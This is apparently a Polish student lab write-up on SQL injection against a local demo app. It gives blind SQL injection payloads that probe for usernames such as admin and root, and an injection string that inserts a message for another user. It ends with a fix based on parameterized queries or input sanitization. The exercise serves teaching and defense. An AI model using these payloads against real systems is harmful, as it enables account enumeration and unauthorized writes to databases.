## Z1
Zastosuj BlindSQL Injection żeby sprawdzić czy w bazie danych znajduje się użytkownik: bach, admin, root, john;
```sql
bob' AND EXISTS ( SELECT username FROM user WHERE username = 'bach') AND '' = '
bob' AND EXISTS ( SELECT username FROM user WHERE username = 'admin') AND '' = '
bob' AND EXISTS ( SELECT username FROM user WHERE username = 'root') AND '' = '
bob' AND EXISTS ( SELECT username FROM user WHERE username = 'john') AND '' = '
```
## Z2
Zastosuj SQL Injection żeby wstrzyknąć użytkownikowi adam wiadomość;
```sql
') ,('adam', 'tajemnicza wiadomosc tajemniczego don pedro z krainy deszczowcow
```
## Z3
Zaproponuj modyfikację kodu hello.py tak, aby aplikacja nie była podatna na SQL Injection (przetestuj swoje zmiany)

Użyć sparametryzowanych zapytać albo sanityzować input. To drugie jest ciutkę gorsze ze względu na fakt tego, że zmieniamy input nadany przez użytkownika. W rozwiązaniu pierwszym nie ma takiego problemu.